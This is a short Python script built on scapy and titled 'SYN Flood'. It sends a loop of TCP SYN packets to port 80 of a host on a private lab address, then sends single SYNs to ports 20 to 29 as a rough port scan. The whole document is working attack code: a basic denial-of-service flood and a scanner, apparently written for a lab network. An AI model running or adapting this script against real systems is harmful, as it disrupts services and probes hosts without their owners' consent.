# SYN Flood
from scapy.all import *



victim_ip = "192.168.56.102"    # victim ip 
victim_port = 80
for i in range(100):
    send(IP(dst=victim_ip)/TCP(dport=victim_port, flags="S"))
for port in range(20, 30):  # Scanning ports 20 to 30
    send(IP(dst=victim_ip)/TCP(dport=port, flags="S"))